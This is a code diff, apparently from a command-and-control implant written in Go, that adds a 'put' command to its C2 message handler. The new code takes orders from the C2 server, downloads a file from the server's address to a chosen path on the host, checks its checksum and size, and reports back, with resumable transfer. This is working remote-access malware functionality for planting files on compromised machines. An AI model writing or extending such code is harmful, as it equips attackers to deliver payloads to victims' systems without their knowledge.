@@ -148,6 +148,39 @@ func processCCData(data *MsgTunData) {
 			goto send
 		}
 
+		// current working directory
+		if cmdSlice[0] == "put" {
+			if len(cmdSlice) < 4 {
+				return
+			}
+
+			url := fmt.Sprintf("%swww/%s", CCAddress, cmdSlice[1])
+			path := cmdSlice[2]
+			size, err := strconv.ParseInt(cmdSlice[3], 10, 64)
+			if err != nil {
+				out = fmt.Sprintf("processCCData: cant get size of %s: %v", url, err)
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				goto send
+			}
+			_, err = DownloadViaCC(url, path)
+			if err != nil {
+				out = fmt.Sprintf("processCCData: cant download %s: %v", url, err)
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				goto send
+			}
+
+			// checksum
+			checksum := tun.SHA256SumFile(path)
+			downloadedSize := util.FileSize(path)
+			out = fmt.Sprintf("%s has been uploaded successfully, sha256sum: %s", path, checksum)
+			if downloadedSize < size {
+				out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, size, checksum)
+			}
+
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
 		// stat file
 		if cmdSlice[0] == "!stat" {
 			if len(cmdSlice) < 2 {
